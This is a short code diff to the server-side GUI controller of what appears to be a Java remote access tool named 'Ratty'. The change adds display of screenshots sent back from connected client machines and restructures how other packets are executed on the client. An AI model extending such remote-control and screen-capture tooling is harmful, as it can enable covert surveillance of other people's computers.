@@ -1,5 +1,6 @@
 package de.sogomn.rat.server.gui;
 
+import java.awt.image.BufferedImage;
 import java.util.ArrayList;
 
 import de.sogomn.rat.ActiveClient;
@@ -70,9 +71,14 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 			final String version = information.getVersion();
 			
 			gui.addRow(id, name, address, os, version);
+		} else if (packet instanceof ScreenshotPacket) {
+			final ScreenshotPacket screenshot = (ScreenshotPacket)packet;
+			final BufferedImage image = screenshot.getImage();
+			
+			gui.showImage(image);
+		} else {
+			packet.execute(client);
 		}
-		
-		packet.execute(client);
 	}
 	
 	@Override
